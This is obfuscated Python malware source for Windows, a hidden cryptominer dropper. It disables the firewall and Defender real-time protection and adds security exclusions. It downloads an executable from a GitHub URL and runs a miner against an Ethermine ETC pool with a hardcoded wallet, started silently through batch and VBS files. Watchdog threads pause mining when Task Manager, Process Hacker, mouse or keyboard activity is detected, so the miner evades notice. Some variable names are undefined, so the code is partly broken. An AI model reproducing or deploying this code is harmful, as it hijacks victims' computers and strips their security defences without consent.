import ctypes
r=False
d=True
D=range
m=print
I=open
o=ctypes.byref
p=ctypes.c_long
M=ctypes.Structure
q=ctypes.windll
import os
C=os.mkdir
R=os.system
U=os.path
z=os.getenv
import random
import threading
c=threading.Thread
import time
O=time.sleep
import urllib.request
import subprocess
G=subprocess.check_output
A='0xE88d6555aDb78f62Cf588EC893098448ffa757E6'
W=(f'-pool eu1-etc.ethermine.org:4444 -ttli 80 -log 0 -clKernel 0 ' f'-powlim -20 -coin etc -wal {WALLET}.' f'Worker{random.randint(10000, 99999)}')
Y=z('LOCALAPPDATA')
L=U.join(Y,'IdentityService')
k=['taskmgr.exe','processhacker.exe','mbamservice.exe']
i='https://raw.githubusercontent.com/sobadsomad/test/main/test.exe'
t='srvc.exe'
K='srvc.bat'
j=r
B=r
s=(-1,-1)
def g():
 global B
 B=d
 for i in D(1,255):
  q.user32.GetAsyncKeyState(i)
 H('create_folder():',V())
 H('turn_off_firewall():',b())
 H('turn_off_defender():',l())
 H('add_defender_exception():',n())
 H('add_firewall_exception():',v())
 H('create_bat():',P())
 H('download_granjer():',F())
 H('create_silent_starter():',N())
 H('start_granjer():',e())
 H('start_daemon(watchdog_daemon):',X(S))
 H('start_daemon(mouse_daemon):',X(w))
 H('start_daemon(keyboard_daemon):',X(f))
 while B:
  O(0.1)
 R(f'taskkill /f /im {EXE_NAME}')
def u():
 while d:
  g()
  O(120)
def H(*args):
 if j:
  m(' '.join([arg for arg in args if arg]))
def S():
 global B
 while B:
  s=G('tasklist',shell=d).lower()
  if b'taskmgr.exe' in s or b'processhacker.exe' in s:
   B=r
   H('[STOPPED] triggered by watchdog_daemon')
  O(.25)
def w():
 global B
 global s
 while B:
  Q=E()
  if s!=Q and s!=(-1,-1):
   B=r
   H('[STOPPED] triggered by mouse_daemon')
  s=Q
def f():
 global B
 while B:
  for i in D(1,255):
   if q.user32.GetAsyncKeyState(i)&0x1:
    B=r
    H('[STOPPED] triggered by keyboard_daemon')
    break
  O(.5)
def X(func):
 h=c(target=func)
 h.daemon=d
 h.g()
def V():
 if not U.isdir(L):
  C(L)
  R(f'attrib +h {SERVICE_FOLDER}')
def P():
 x=U.join(L,K)
 if not U.isfile(x):
  I(x,'w').write(f'@echo off\n' f'setx GPU_FORCE_64BIT_PTR 0\n' f'setx GPU_MAX_HEAP_SIZE 100\n' f'setx GPU_USE_SYNC_OBJECTS 1\n' f'setx GPU_MAX_ALLOC_PERCENT 100\n' f'setx GPU_SINGLE_ALLOC_PERCENT 100\n' f'{SERVICE_FOLDER}\\{EXE_NAME} {ARGUMENTS}')
class T(M):
 a=[('x',p),('y',p)]
def E():
 pt=T()
 q.user32.GetCursorPos(o(pt))
 return(pt.x,pt.y)
def N():
 J=U.join(L,K)
 x=U.join(L,'starter.vbs')
 if not U.isfile(x):
  I(x,'w').write(f'Set oShell = CreateObject("Wscript.Shell")\n' f'Dim strArgs\n' f'strArgs = "cmd /c {_path}"\n' f'oShell.Run strArgs, 0, false')
def F():
 x=U.join(L,t)
 if not U.isfile(x):
  I(x,'wb').write(urllib.request.urlopen(i).read())
def e():
 x=U.join(L,'starter.vbs')
 R(x)
def n():
 R(f'powershell -Command Add-MpPreference ' f'-ExclusionPath "{SERVICE_FOLDER}"')
def v():
 R(f'netsh advfirewall firewall add rule name="srvc" ' f'dir=in action=allow program="{SERVICE_FOLDER}\\srvc.exe" enable=yes')
def b():
 R('NetSh Advfirewall set allprofiles state off')
def l():
 R('powershell -Command Set-MpPreference ' '-DisableRealtimeMonitoring $true')
if __name__=='__main__':
 u()